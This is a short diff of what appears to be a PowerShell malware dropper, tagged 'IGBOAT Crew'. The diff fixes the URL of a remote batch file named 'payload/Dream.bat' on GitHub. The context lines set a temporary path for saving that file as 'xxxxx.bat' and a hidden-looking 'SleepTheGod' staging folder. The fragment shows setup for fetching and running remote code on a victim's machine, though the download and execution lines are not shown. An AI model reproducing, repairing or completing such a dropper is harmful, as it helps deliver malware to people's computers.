@@ -1,4 +1,4 @@
-$a = "<https://raw.githubusercontent.com/baledreamer/payload/refs/heads/main/Dream.bat>"
+$a = "https://raw.githubusercontent.com/baledreamer/payload/refs/heads/main/Dream.bat"
 # IGBOAT Crew
 $y = "$env:temp\\xxxxx.bat"
 $sleepTheGodFilePath = Join-Path $env:LocalAppData "Temp\\SleepTheGod"
